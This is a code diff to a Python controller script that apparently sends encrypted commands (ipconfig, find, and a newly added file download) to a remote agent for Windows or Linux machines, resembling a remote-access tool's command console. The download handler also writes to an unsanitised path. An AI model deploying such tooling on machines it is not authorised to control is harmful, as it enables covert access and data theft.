@@ -8,7 +8,6 @@ from commands.Windows import WindowsCommands
 from commands.Linux import LinuxCommands
 
 
-
 def main():
     env = EnvReader()
 
@@ -56,14 +55,12 @@ def main():
             break
 
         elif command == "ipconfig" or command == "find":
-            
+
             match command:
                 case "ipconfig":
                     command_trsl = commands_trsl.ipconfig()
                 case "find":
-                    command_trsl =  commands_trsl.search(params)
-
-
+                    command_trsl = commands_trsl.search(params)
 
             request = json.dumps({
                 'type': 'command',
@@ -73,9 +70,30 @@ def main():
             response = listener.prompt(cipher.encrypt_message(request))
             decrypted = cipher.decrypt_message(response)
             result = json.loads(decrypted)
-            
+
             print(result["response"].encode('utf-8'))
 
+
+        elif command == "download":
+            request = json.dumps({
+                'type': 'download',
+                'action': params
+            }).encode('utf-8')
+
+            response = listener.prompt(cipher.encrypt_message(request))
+            decrypted = cipher.decrypt_message(response)
+            # result = json.loads(decrypted)
+            file = open('download/' + params, 'wb')
+            file.write(decrypted.encode('UTF-8'))
+            file.close()
+            print("Download complete!")
+            # if result["status"] == "OK":
+            #     file = open('download/' + command, 'wb')
+            #     file.write(result["response"])
+            #     file.close()
+            #     print("Download complete!")
+            # else:
+            #     print("Error:" + result["response"])
         else:
             data = json.dumps(
                 {
